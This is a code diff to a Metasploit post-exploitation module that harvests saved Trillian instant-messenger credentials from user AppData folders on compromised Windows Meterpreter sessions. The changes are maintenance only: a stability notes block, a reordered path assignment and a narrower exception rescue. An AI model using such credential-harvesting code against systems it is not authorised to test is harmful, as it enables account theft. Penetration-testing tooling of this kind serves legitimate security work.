@@ -24,6 +24,11 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -41,8 +46,10 @@ class MetasploitModule < Msf::Post
 
   def run
     grab_user_profiles.each do |user|
-      accounts = user['AppData'] + '\\Trillian\\users\\global\\accounts.ini'
       next if user['AppData'].nil?
+
+      accounts = user['AppData'] + '\\Trillian\\users\\global\\accounts.ini'
+
       next if accounts.empty?
 
       stat = begin
@@ -96,7 +103,7 @@ class MetasploitModule < Msf::Post
       'Trillian Instant Messenger User Credentials'
     )
     print_good("Trillian Instant Messenger user credentials saved in: #{path}")
-  rescue ::Exception => e
+  rescue StandardError => e
     print_error("An error has occurred: #{e}")
   end
 
